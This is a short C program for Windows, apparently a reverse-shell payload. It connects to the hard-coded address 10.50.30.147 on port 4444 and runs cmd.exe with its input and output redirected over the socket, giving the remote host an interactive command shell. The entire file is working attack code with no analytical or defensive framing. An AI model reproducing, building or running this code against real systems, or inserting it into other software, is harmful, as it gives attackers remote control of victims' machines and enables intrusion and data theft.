#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>
#include <winsock2.h> // Required for Windows socket functions

// Link with ws2_32.lib
#pragma comment(lib, "ws2_32")

WSADATA wsaData;
SOCKET Winsock;
struct sockaddr_in hax;

char ip_addr[16] = "10.50.30.147";  // IP address to connect to
char port[6] = "4444";              // Port number to connect to

STARTUPINFO ini_processo;
PROCESS_INFORMATION processo_info;

int main() {
    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("WSAStartup failed. Error: %d\n", WSAGetLastError());
        return 1;
    }

    // Create a socket
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (Winsock == INVALID_SOCKET) {
        printf("WSASocket failed. Error: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    // Set up the sockaddr_in structure for the connection
    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi(port));  // Convert port string to integer and set
    hax.sin_addr.s_addr = inet_addr(ip_addr);  // Convert IP string to binary format

    // Connect to the target IP and port
    if (WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        printf("WSAConnect failed. Error: %d\n", WSAGetLastError());
        closesocket(Winsock);
        WSACleanup();
        return 1;
    }

    // Prepare to launch the process (redirect stdin, stdout, stderr to the socket)
    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

    // Set the command to run (cmd.exe)
    char cmd[255] = "cmd.exe";

    // Create the process (run cmd.exe)
    if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info)) {
        printf("CreateProcess failed. Error: %d\n", GetLastError());
        closesocket(Winsock);
        WSACleanup();
        return 1;
    }

    // Wait for the process to finish (optional)
    WaitForSingleObject(processo_info.hProcess, INFINITE);

    // Clean up
    closesocket(Winsock);
    WSACleanup();
    
    return 0;
}

